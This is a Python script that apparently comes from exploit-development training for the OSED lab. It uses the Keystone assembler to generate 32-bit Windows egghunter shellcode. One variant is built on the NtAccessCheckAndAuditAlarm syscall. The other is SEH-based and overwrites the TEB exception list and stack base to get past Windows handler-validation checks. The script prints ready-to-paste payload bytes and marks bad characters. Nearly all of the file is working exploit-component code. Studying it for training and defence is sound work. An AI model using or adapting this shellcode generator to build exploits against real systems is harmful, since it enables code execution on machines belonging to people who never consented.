#!/usr/bin/python3
import argparse
import sys

import keystone as ks


class Color:
    def __init__(self, disabled=False):
        if disabled:
            self.red = self.green = self.yellow = self.blue = ""
            self.reset = ""
        else:
            self.red = "\033[31m"
            self.green = "\033[32m"
            self.yellow = "\033[33m"
            self.blue = "\033[34m"
            self.reset = "\033[0m"


def is_valid_tag_count(s):
    return True if len(s) == 4 else False


def tag_to_hex(s):
    string = s
    if is_valid_tag_count(s) == False:
        args.tag = "c0d3"
        string = args.tag
    retval = list()
    for char in string:
        retval.append(hex(ord(char)).replace("0x", ""))
    return "0x" + "".join(retval[::-1])


# To find the current system call number for NtAccessCheckAndAuditAlarm, you can use the following WinDbg command:
# 0:000> u ntdll!NtAccessCheckAndAuditAlarm
def ntaccess_hunter(tag):
    asm = f"""
        push esp
        pop edx
    loop_inc_page:
        or dx, 0x0fff
    loop_inc_one:
        inc edx
    loop_check:
        push edx
        xor eax, eax
        add ax, 0x01c6
        int 0x2e
        cmp al, 05
        pop edx
    loop_check_valid:
        je loop_inc_page
    is_egg:
        mov eax, {tag_to_hex(tag)}
        mov edi, edx
        scasd
        jnz loop_inc_one
    first_half_found:
        scasd
        jnz loop_inc_one
    matched_both_halves:
        jmp edi
    """
    return asm


def seh_hunter(tag):
    asm = [
        "start:",
        "jmp get_seh_address",  # start of jmp/call/pop
        "build_exception_record:",
        "pop ecx",  # address of exception_handler
        f"mov eax, {tag_to_hex(tag)}",  # tag into eax
        "push ecx",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
        "push 0xffffffff",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
        "xor ebx, ebx",
        "mov dword ptr fs:[ebx], esp",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
        # bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
        "sub ecx, 0x04",  # substract 0x04 from the pointer to exception_handler
        "add ebx, 0x04",  # add 0x04 to ebx
        "mov dword ptr fs:[ebx], ecx",  # overwrite the StackBase in the TEB
        "is_egg:",
        "push 0x02",
        "pop ecx",  # load 2 into counter
        "mov edi, ebx",  # move memory page address into edi
        "repe scasd",  # check for tag, if the page is invalid we trigger an exception and jump to our exception_handler function
        "jnz loop_inc_one",  # didn't find signature, increase ebx and repeat
        "jmp edi",  # found the tag
        "loop_inc_page:",
        "or bx, 0xfff",  # if page is invalid the exception_handler will update eip to point here and we move to next page
        "loop_inc_one:",
        "inc ebx",  # increase memory page address by a byte
        "jmp is_egg",  # check for the tag again
        "get_seh_address:",
        "call build_exception_record",  # call portion of jmp/call/pop
        "push 0x0c",
        "pop ecx",  # store 0x0c in ecx to use as an offset
        "mov eax, [esp+ecx]",  # mov into eax the pointer to the CONTEXT structure for our exception
        "mov cl, 0xb8",  # mov 0xb8 into ecx which will act as an offset to the eip
        # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
        "add dword ptr ds:[eax+ecx], 0x06",
        "pop eax",  # save return address in eax
        "add esp, 0x10",  # increase esp to clean the stack for our call
        "push eax",  # push return value back into the stack
        "xor eax, eax",  # null out eax to simulate ExceptionContinueExecution return
        "ret",
    ]
    return "\n".join(asm)


def print_asm_lines(asm_source, eng, bad_chars, no_color=False):
    colors = Color(disabled=no_color)

    lines = [l for l in asm_source.splitlines() if l.strip()]

    try:
        # try incremental mode
        asm_blocks = ""
        prev_size = 0
        full_encoding = None

        for line in lines:
            asm_blocks += line + "\n"
            encoding, count = eng.asm(asm_blocks)  # may fail for SEH
            if not encoding:
                continue
            prev_size = len(encoding)
        full_encoding = encoding  # no error → incremental mode OK

        incremental_ok = True

    except ks.KsError:
        # SEH case → must assemble full block once
        incremental_ok = False
        full_encoding, count = eng.asm(asm_source)

    # Now print per line slices
    byte_index = 0

    # Determine longest line for formatting
    max_line_len = max(len(line) for line in lines)
    col1_width = max_line_len + 6
    print(
        f"{colors.blue}{'[+] Egghunter assembly code'.ljust(col1_width)}Corresponding bytes{colors.reset}"
    )
    for line in lines:
        enc_opcode = ""

        # Assemble this single line to get its size
        # (Keystone supports isolated-line assembly even for labels)
        try:
            line_enc, _ = eng.asm(line)
            line_size = len(line_enc)
        except ks.KsError:
            # labels alone (e.g. "start:") assemble to nothing
            line_size = 0

        # Slice bytes
        current = full_encoding[byte_index : byte_index + line_size]
        byte_index += line_size

        # Color bad bytes
        for b in current:
            hb = f"{b:02x}"
            if hb in bad_chars:
                enc_opcode += f"{colors.red}0x{hb}{colors.reset} "
            else:
                enc_opcode += f"0x{hb} "

        spacer = 30 - len(line)
        print(f"{line.ljust(col1_width)}{enc_opcode}")

    # Convert bad chars to integer values
    badvals = {int(x.replace("\\x", ""), 16) for x in bad_chars}

    # Find where bad chars appear
    bad_positions = {}
    for idx, b in enumerate(full_encoding):
        if b in badvals:
            bad_positions.setdefault(b, []).append(idx)

    return full_encoding, count, bad_positions


def main(args):
    colors = Color(disabled=args.no_color)

    egghunter = ntaccess_hunter(args.tag) if not args.seh else seh_hunter(args.tag)

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)

    encoding, count, bad_positions = print_asm_lines(
        egghunter, eng, args.bad_chars, no_color=args.no_color
    )

    final = ""
    final += 'egghunter =  b"'

    for i, enc in enumerate(encoding):
        if i % 11 == 0:
            final += '"\negghunter += b"'
        final += "\\x{0:02x}".format(enc)

    final += '"'

    print()
    print(f"{colors.green}[+] egghunter created!{colors.reset}")
    print(f"[=]   len: {len(encoding)} bytes")
    print(f"[=]   tag: {args.tag * 2}")
    print(f"[=]   ver: {['NtAccessCheckAndAuditAlarm', 'SEH'][args.seh]}\n")
    print(final)

    if len(bad_positions) > 0:
        print()
        print(f"{colors.red}[!] Bad characters found in egghunter!{colors.reset}")
        print(f"{'Bad Char':<10}{'Positions':<25}")
        for b in sorted(bad_positions.keys()):
            positions = ", ".join(str(p) for p in bad_positions[b])
            print(f"{colors.red}0x{b:02x}{colors.reset}      {positions}")
        print()
        raise SystemExit(
            f"{colors.red}[!] Remove bad characters and try again{colors.reset}"
        )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Creates an egghunter compatible with the OSED lab VM"
    )

    parser.add_argument(
        "-t",
        "--tag",
        help="tag for which the egghunter will search (default: c0d3)",
        default="c0d3",
    )
    parser.add_argument(
        "-b",
        "--bad-chars",
        help="space separated list of bad chars to check for in final egghunter (default: 00)",
        default=["00"],
        nargs="+",
    )
    parser.add_argument(
        "-s",
        "--seh",
        help="create an seh based egghunter instead of NtAccessCheckAndAuditAlarm",
        action="store_true",
    )
    parser.add_argument(
        "--no-color", action="store_true", help="Disable ANSI color output"
    )

    args = parser.parse_args()

    main(args)
